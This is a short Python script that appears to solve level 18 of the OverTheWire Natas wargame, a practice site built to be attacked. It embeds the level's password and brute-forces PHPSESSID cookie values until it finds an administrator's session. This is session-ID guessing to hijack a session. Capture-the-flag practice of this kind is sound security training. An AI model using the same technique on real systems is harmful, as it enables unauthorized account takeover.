import requests

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = "http://%s.natas.labs.overthewire.org" % username
r = requests.get(url, auth = (username,password))

for i in range(640):
    print(i)
    cookies = {
        'PHPSESSID': str(i),
    }
    r = requests.get(url, params={'debug': ''}, cookies=cookies, auth=(username, password))
    if  'regular user' not in r.text:
        print(r.text)
        break